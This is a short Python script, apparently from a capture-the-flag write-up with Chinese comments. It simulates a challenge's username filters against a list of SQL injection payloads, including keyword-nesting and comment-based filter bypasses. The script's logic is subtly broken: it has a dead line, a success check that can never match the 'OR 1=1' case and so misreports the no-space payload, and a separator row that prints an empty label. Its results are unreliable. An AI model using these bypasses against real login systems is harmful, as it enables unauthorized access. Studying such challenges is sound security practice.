"""Simulate the challenge's server-side filters (routes/index.js logic) against
the B-line's actual payload sequence — proving where each attempt broke."""

def trim_whitespace(s: str) -> str:
    # index.js:23 regex /[ %]/ — truncate at FIRST space (or %)
    i = s.search if False else None
    import re
    m = re.search(r"[ %]", s)
    return s[:m.start()] if m else s

def server_view(username: str) -> str:
    u = trim_whitespace(username)
    u = u.replace("admin", "")          # index.js:93, once
    return u

def sql_for(username: str) -> str:
    # authenticate(): uname='${name}' AND pass='${sha256(password)}'
    return f"SELECT rowid FROM users WHERE uname = '{server_view(username)}' AND pass = '<hash>'"

ATTEMPTS = [
    ("admin",                              "B线首发：纯用户名"),
    ("admin' OR 1=1",                      "B线第2发（%20 空格）"),
    ("' OR 1=1--",                         "B线第3发（前导引号+空格）"),
    ("adm",                                "B线第4发：疑似过滤器探测"),
    ("--- 以下是解法 ---",                 ""),
    ("admin'--",                           "解法A：直接注释（会被过滤）"),
    ("adadminmin'--",                      "解法B：嵌套关键词（正确）"),
    ("'/**/OR/**/1=1--",                   "解法C：无空格 OR 注入"),
]

print(f"{'payload':32s} {'过滤后':22s} 生成的 SQL WHERE 子句")
print("-" * 100)
for p, note in ATTEMPTS:
    if p.startswith("---"):
        print(f"\n[{note}]")
        continue
    v = server_view(p)
    ok = "→ 命中 admin" if v.endswith("'--") or "OR 1=1" in v.replace(" ", "") else "→ 无行返回"
    print(f"{p:32s} {v!r:22s} uname='{v}' ... {ok}   | {note}")
